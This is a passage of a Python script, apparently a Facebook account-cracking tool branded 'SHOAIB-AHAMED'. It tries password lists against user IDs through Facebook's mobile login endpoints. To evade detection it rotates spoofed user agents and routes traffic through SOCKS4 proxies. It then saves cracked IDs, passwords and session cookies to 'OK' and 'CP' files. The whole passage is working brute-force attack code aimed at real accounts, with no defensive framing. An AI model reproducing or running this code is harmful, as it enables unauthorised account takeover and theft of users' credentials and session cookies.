if 'mobile' in method:
				pool.submit(crackmobile_SHOAIB,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_SHOAIB,idf,pwv,nmf)
			else:
				pool.submit(crackmbasic,idf,pwv,nmf)
	print(f'{N}╭───[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('│')
	print(f'[{b}•{x}] Crack Again ( Y/t ) ? ')
	woi = input(f'╰───[{b}•{x}] Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crackmobile_SHOAIB(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r\x1b[1;90m[%s\x1b[1;33mSHOAIB-AHAMED\x1b[1;90m]-[\x1b[1;96m%s\x1b[1;90m/\x1b[1;95m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\x1b[1;93mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5; like Mac OS X) AppleWebKit/600.43 (KHTML, like Gecko)  Chrome/51.0.2458.138 Mobile Safari/602.3',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/601.12 (KHTML, like Gecko)  Chrome/47.0.1741.400 Mobile Safari/601.4',
'Mozilla/5.0 (iPhone; CPU iPhone OS 7_2_5; like Mac OS X) AppleWebKit/535.37 (KHTML, like Gecko)  Chrome/55.0.1438.376 Mobile Safari/603.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_8; like Mac OS X) AppleWebKit/601.9 (KHTML, like Gecko)  Chrome/52.0.2927.225 Mobile Safari/535.9',
'Mozilla/5.0 (iPhone; CPU iPhone OS 8_2_3; like Mac OS X) AppleWebKit/534.44 (KHTML, like Gecko)  Chrome/51.0.2055.387 Mobile Safari/602.9',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_7; like Mac OS X) AppleWebKit/602.34 (KHTML, like Gecko)  Chrome/54.0.1280.327 Mobile Safari/601.2',
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_9; like Mac OS X) AppleWebKit/534.26 (KHTML, like Gecko)  Chrome/49.0.1455.201 Mobile Safari/603.9',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_0; like Mac OS X) AppleWebKit/537.3 (KHTML, like Gecko)  Chrome/52.0.2335.107 Mobile Safari/603.5',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_6_7; like Mac OS X) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/48.0.1600.178 Mobile Safari/602.4',
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_8; like Mac OS X) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/51.0.1116.123 Mobile Safari/600.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.53 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1 OPX/1.5.2',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5339d [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5312j [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/22.7.6.401.10 YaApp_iOS/2207.6 YaApp_iOS_Browser/2207.6 Safari/604.1 SA/3',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/218.0.456502374 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.0 Safari/605.1.15',
'Mozilla/5.0 (iPad; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.1 Safari/605.1.15',
'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/76.0.3809.123 Mobile/15E148 Safari/605.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/113.0.5672.121 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/113.0.5672.121 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17.0 like Mac OS X) AppleWebKit/(KHTML, like Gecko) Version/16.4 Mobile/Safari',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/12.5.5 Safari/605.1.15',
'Mozilla/5.0 (iPad; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/12.5.5 Safari/605.1.15',
'Mozilla/5.0 (iPad; CPU OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBAV/183.0.0.36.93;FBBV/123940704;FBDV/iPad4,7;FBMD/iPad;FBSN/iOS;FBSV/12.0;FBSS/2;FBCR/;FBID/tablet;FBLC/es_LA;FBOP/5;FBRV/0]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
'Autoplius.lt/6.6.0 Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 EmbeddedBrowser DeviceUID:','Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/221.0.461030601 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.3.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36'
])
	ua2 = random.choice(['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 RuxitSynthetic/1.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1 RuxitSynthetic/1.0',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; Zoom 3.6.0)','Mozilla/5.0 (iPad; CPU OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 11; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; moto g stylus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile',
'Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36',
'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.6.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; ART-L29; HMSCore 6.6.0.311) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; ELS-NX9; HMSCore 6.6.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.0.303 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; jhs561 Build/GIADA.eng.zc.20200922.153858; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; 17MB150WB Build/NZH54D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Safari/537.36'
])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}╭───[SHOAIB-CP]\n└──╭➣ EMAIL: {k}{idf}{N}\n └──╭➣ PASSWORD: {k}{pw}{N}\n   └───➣{m} {ua}{N}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}╭───[SHOAIB-OK]\n└──╭➣ EMAIL:  {H}{idf}{N}\n  └──╭➣ PASSWORD:  {H}{pw}{N}\n  └──╭➣ Cokkie: {H}{kuki} ')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_SHOAIB(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
